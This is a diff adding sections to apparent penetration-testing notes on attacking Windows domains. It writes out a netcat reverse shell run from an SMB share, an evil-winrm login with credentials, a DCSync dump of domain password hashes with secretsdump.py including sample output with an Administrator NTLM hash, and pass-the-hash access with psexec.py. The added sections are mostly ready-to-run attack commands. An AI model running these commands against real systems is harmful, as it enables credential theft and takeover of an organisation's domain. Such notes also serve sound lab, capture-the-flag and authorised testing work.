@@ -71,6 +71,47 @@ it by sharing a SMB folder.
     \\10.10.10.10\smbFolder\nc.exe -e cmd 10.10.10.10 443
     ```
 
+## Connection throw WinRM with evil-winrm {-}
+
+If you have user credentials and the machine have port 5985 or WinRM running in another port, you can connect to the machine
+with **evil-winrm** tool
+
+1. Install evil-winrm
+
+    ```bash
+    sudo gem install evil-winrm
+    ```
+
+1. Connect with evil-winrm
+
+    ```bash
+    evil-winrm -i 10.10.10.10 -u username -p Password1234
+    ```
+
+## Exploit GetChangesAll privilege vulnerability {-}
+
+The **GetChangesAll** privilege can be considert as a vunlnerability when you have the credentials of this user, because attacker cannot
+perform a DCSync attack in order to dump the NTLM of all domain users.
+You can check if user have this privilege with a tool like **Bloodhound**.
+
+To perform this kind of attack you can use the **secretsdump.py** script who comes with te Impacket library
+
+```bash
+locate secretsdump
+secretsdump.py -dc-ip 10.10.10.10 DOMAIN.NAME/user:Password1234@10.10.10.10
+
+#OUTPUT
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
+```
+You can then connect to the victim machine by using psexec.py
+
+```bash
+psexec.py domain.name/administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+```
+
 ## Powershell access with Nishang {-}
 
 Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration
